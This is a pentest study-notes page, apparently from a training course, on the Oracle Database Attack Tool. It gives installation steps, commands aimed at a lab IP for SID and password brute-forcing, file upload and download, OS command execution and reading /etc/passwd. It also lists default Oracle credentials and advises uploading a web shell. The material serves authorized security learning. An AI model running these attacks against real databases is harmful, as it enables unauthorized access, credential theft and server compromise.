---
tags: [tool]
module: footprinting
last_updated: 2026-05-10
source_count: 1
---

# ODAT (Oracle Database Attack Tool)

ODAT is an open-source Python tool for enumerating and exploiting Oracle Database instances — covering SID discovery, credential brute-forcing, and post-exploitation via PL/SQL packages.

## Overview

ODAT (by Quentin Hardy) automates common Oracle Database attack techniques. It requires the cx_Oracle Python package and Oracle Instant Client libraries, making setup more involved than most tools.

GitHub: `https://github.com/quentinhardy/odat`

### Installation

```bash
sudo apt-get install -y build-essential python3-dev libaio1
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init && git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap pycryptodome

# Fix sqlplus shared library error
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

## Commands / Syntax

```bash
# Show all modules
./odat.py -h

# Run ALL modules against a target (comprehensive)
./odat.py all -s 10.129.204.235

# SID guessing (enumerate valid SIDs)
./odat.py sidguesser -s 10.129.204.235

# Password guessing (brute-force credentials for a known SID)
./odat.py passwordguesser -s 10.129.204.235 -d XE

# Upload a file to the target (requires file write privilege)
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger \
    --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Get a file from the target
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger \
    --sysdba --getFile C:\\inetpub\\wwwroot testing.txt ./testing_local.txt

# Execute OS commands (requires Java in DB)
./odat.py java -s 10.129.204.235 -d XE -U scott -P tiger \
    --sysdba --exec "whoami"

# External table file read
./odat.py externaltable -s 10.129.204.235 -d XE -U scott -P tiger \
    --sysdba --getFile /etc/passwd /tmp passwd_dump.txt

# Check for privilege escalation paths
./odat.py privesc -s 10.129.204.235 -d XE -U scott -P tiger
```

## Flags & Options

| Flag | Description |
|------|-------------|
| `-s <IP>` | Target server |
| `-d <SID>` | Database SID |
| `-U <user>` | Username |
| `-P <pass>` | Password |
| `--sysdba` | Connect as SYSDBA |
| `--sysoper` | Connect as SYSOPER |
| `--port <N>` | Port (default 1521) |

## Module Reference

| Module | Description |
|--------|-------------|
| `all` | Run all applicable modules |
| `sidguesser` | Brute-force SID from a wordlist |
| `snguesser` | Service name guessing |
| `passwordguesser` | Credential brute-force |
| `utlhttp` | HTTP requests from DB server |
| `httpuritype` | Alternative HTTP via HTTPURITYPE |
| `utltcp` | TCP connections from DB |
| `utlfile` | Read/write files via UTL_FILE |
| `externaltable` | Read files via external tables |
| `dbmsxslprocessor` | File upload via XSLT |
| `dbmsadvisor` | File write via DB advisor |
| `dbmsscheduler` | OS command execution via scheduler |
| `java` | OS command execution via Java |
| `stealremotepwds` | Capture passwords via DB links |
| `userlikepwd` | Test username-as-password combinations |
| `smb` | SMB relay via UTL_HTTP |
| `privesc` | Identify privilege escalation paths |
| `search` | Search for sensitive data in DB |

## Common Credentials to Test

| Username | Password | Notes |
|----------|----------|-------|
| scott | tiger | Classic Oracle demo account |
| system | manager | Common default |
| sys | change_on_install | Oracle 9 default |
| dbsnmp | dbsnmp | DBSNMP monitoring service |
| ADMIN | ADMIN | Supermicro-style default |

## Gotchas & Notes

- **Complex setup**: cx_Oracle requires Oracle Instant Client. This can be tricky on Kali/Parrot — document the install commands for repeatability.
- **`all` module**: Runs every applicable module sequentially. Generates significant noise; use specific modules when stealth matters.
- **`--sysdba` escalation**: If `scott/tiger` works as a normal user, immediately try `--sysdba`. Many demonstration databases grant SYSDBA to scott.
- **utlfile path**: File upload path must use correct OS separators — backslash for Windows (`C:\\inetpub\\wwwroot`), forward slash for Linux (`/var/www/html`).
- **Web shell upload**: If the Oracle server runs a web server, upload a web shell to the web root via utlfile and verify with curl.
- **PL/SQL Exclusion List**: If ODAT modules fail unexpectedly, the target may have a `PlsqlExclusionList` blocking specific packages.
- The `sidguesser` module uses a built-in SID wordlist — always try `XE`, `ORCL`, `PROD`, `DEV`, and `TEST` as common SIDs manually if the tool doesn't find them.

## Related Pages

- [[enumeration/oracle_tns]]
- [[enumeration/mysql]]
- [[enumeration/mssql]]

## Sources

- raw/footprinting/host_based_enumeration_oracle_tns.md
